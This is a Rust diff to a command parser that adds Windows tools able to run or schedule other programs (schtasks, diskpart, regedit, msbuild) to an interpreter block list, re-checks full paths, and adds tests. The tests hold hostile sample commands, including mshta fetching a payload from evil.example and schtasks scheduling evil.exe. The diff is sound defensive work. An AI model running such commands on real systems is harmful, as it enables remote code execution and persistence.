@@ -53,6 +53,16 @@ const INTERPRETER_STEMS: &[&str] = &[
     "javaw",
     "python",
     "node",
+    // Windows tools that run, change or schedule something else on request.
+    "conhost",
+    "forfiles",
+    "pcalua",
+    "regedit",
+    "reg",
+    "diskpart",
+    "schtasks",
+    "msbuild",
+    "installutil",
 ];
 
 /// How the UI (and later the executor) should treat a parsed command.
@@ -227,6 +237,14 @@ pub fn parse(raw: &str) -> Result<Classification, ParseError> {
         });
     }
 
+    // The rejoined path may name an interpreter the first token hid
+    // ("C:\Users\me\My Tools\cmd.exe"), so check its stem again.
+    if INTERPRETER_STEMS.contains(&program_stem(&path).as_str()) {
+        return Ok(Classification::ManualOnly {
+            reason: ManualReason::InterpreterInvocation,
+        });
+    }
+
     let args: Vec<String> = tokens[args_start..].to_vec();
     if args.len() > MAX_ARGS {
         return Err(ParseError::TooManyArguments);
@@ -317,6 +335,11 @@ mod tests {
             r"wscript.exe C:\ProgramData\payload.vbs",
             "mshta.exe http://evil.example/payload.hta",
             "regsvr32 /s /u evil.dll",
+            r"C:\Users\me\My Tools\cmd.exe /c evil.bat",
+            r"C:\Windows\System32\diskpart.exe /s C:\Users\me\s.txt",
+            r"regedit.exe /s C:\Users\me\evil.reg",
+            r"C:\Windows\System32\forfiles.exe /c evil",
+            r"schtasks /create /tn x /tr evil.exe",
         ] {
             assert_eq!(
                 parse(raw).unwrap(),
